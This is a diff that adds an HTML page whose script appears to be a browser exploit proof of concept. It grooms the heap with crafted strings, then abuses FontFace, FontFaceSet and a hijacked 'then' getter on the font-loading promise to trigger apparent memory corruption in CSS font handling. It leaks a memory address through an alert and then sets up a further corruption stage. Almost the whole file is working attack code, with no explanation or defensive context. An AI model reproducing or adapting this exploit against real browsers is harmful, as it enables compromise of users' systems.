@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<style id="s">
+@font-face {
+    font-family: x;
+    src: url(nonexistent-font.woff);
+    unicode-range: U+0042;
+}
+</style>
+</head>
+<body>
+<script>
+
+function ptrToString(p) {
+    var s = '';
+    for (var i = 0; i < 8; i++) {
+        s += String.fromCharCode(p % 256);
+        p = (p - p % 256) / 256;
+    }
+    return s;
+}
+
+function stringToPtr(s, o) {
+    if (o === undefined) o = 0;
+    var ans = 0;
+    for (var i = 7; i >= 0; i--)
+        ans = 256 * ans + s.charCodeAt(o + i);
+    return ans;
+}
+
+var HASHMAP_BUCKET = 0xB8;
+var STRING_OFFSET  = 0x14;
+var string_id = 10000000;
+var strings = [];
+var keepAlive = [];
+
+var GUESS_FONT = 0x200430000;
+var p_s = ptrToString(GUESS_FONT);
+
+var fake_head = p_s.substr(0, 4)
+              + String.fromCharCode(0x74)
+              + String.fromCharCode(0x00)
+              + p_s.substr(6, 2);
+
+function mkString(l, head) {
+    var s = head
+        + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length)
+        + (string_id++);
+
+    var el = document.createElement('div');
+    el.className = s;
+    document.body.appendChild(el);
+    document.getElementsByClassName(s);
+    document.body.removeChild(el);
+
+    strings.push(s);
+    return s;
+}
+
+function flushDeallocatorLog() {
+    var temp = [];
+    for (var i = 0; i < 512; i++) {
+        var st = document.createElement('style');
+        st.textContent = '.flush' + i + '{ color: red; }';
+        document.head.appendChild(st);
+        temp.push(st);
+    }
+    for (var i = 0; i < temp.length; i++) {
+        document.head.removeChild(temp[i]);
+    }
+    temp = [];
+    for (var i = 0; i < 512; i++) {
+        var st = document.createElement('style');
+        st.textContent = '.trigger' + i + '{ color: blue; }';
+        document.head.appendChild(st);
+        keepAlive.push(st);
+    }
+}
+
+window.onload = () => {
+
+    var fonts = [];
+    var fired = false;
+
+    var bad_fonts = [];
+    for (var i = 0; i < 0x100; i++) {
+        bad_fonts.push(new FontFace("font" + i, "", {}));
+    }
+
+    for (var i = 0; i < 256; i++) {
+        mkString(HASHMAP_BUCKET, fake_head);
+    }
+
+    var ffs = new FontFaceSet(bad_fonts);
+    var badstr = mkString(HASHMAP_BUCKET, fake_head);
+
+    let A = new FontFace(
+        'x',
+        'local(Helvetica)',
+        { unicodeRange: 'U+0041' }
+    );
+
+    document.fonts.add(A);
+    void A.loaded;
+
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            if (!fired && this === A) {
+                fired = true;
+
+                for (let i = 0; i < 1000; i++) {
+                    let f = new FontFace(
+                        'y' + i,
+                        'local(Helvetica Bold)',
+                        {
+                            unicodeRange:
+                            'U+' + (0x41 + (i % 26)).toString(16)
+                        }
+                    );
+                    document.fonts.add(f);
+                    fonts.push(f);
+                }
+
+                let sheet = document.getElementById('s').sheet;
+
+                sheet.insertRule(`
+                    @font-face {
+                        font-family: init;
+                        src: url(nonexistent-init.woff);
+                        unicode-range: U+0041;
+                    }
+                `, 0);
+
+                void document.body.offsetTop;
+
+                sheet.deleteRule(0);
+
+                sheet.deleteRule(0);
+
+                // flush to deallocator log
+                flushDeallocatorLog();
+
+
+                for (var i = 0; i < 256; i++) {
+                    mkString(HASHMAP_BUCKET, fake_head);
+                }
+
+
+                for (var i = 0; i < bad_fonts.length; i++) {
+                    bad_fonts[i].family = "evil" + i;
+                    if (badstr.substr(0, fake_head.length) !== fake_head) {
+                        var leaked = stringToPtr(badstr);
+                        alert("leaked addr: 0x" + leaked.toString(16));
+                        break;
+                    }
+                }
+
+                sheet.insertRule(`
+                    @font-face {
+                        font-family: boom;
+                        src: url(nonexistent2.woff);
+                        unicode-range: U+0041;
+                    }
+                `, 0);
+
+                document.body.style.fontFamily = 'boom';
+
+                for (let i = 0; i < 128; i++) {
+                    document.body.offsetTop;
+                }
+
+                for (let i = 0; i < 128; i++) {
+                    document.fonts.load('1em boom', 'AAAA');
+                }
+
+                for (let i = 0; i < 128; i++) {
+                    let st = document.createElement('style');
+                    st.textContent =
+                        '* { font-family: y' + i + '; }';
+                    document.head.appendChild(st);
+                }
+            }
+            return undefined;
+        }
+    });
+
+    for (let i = 0; i < 128; i++) {
+        document.fonts.load('1em x', 'AB');
+    }
+};
+
+</script>
+</body>
+</html>
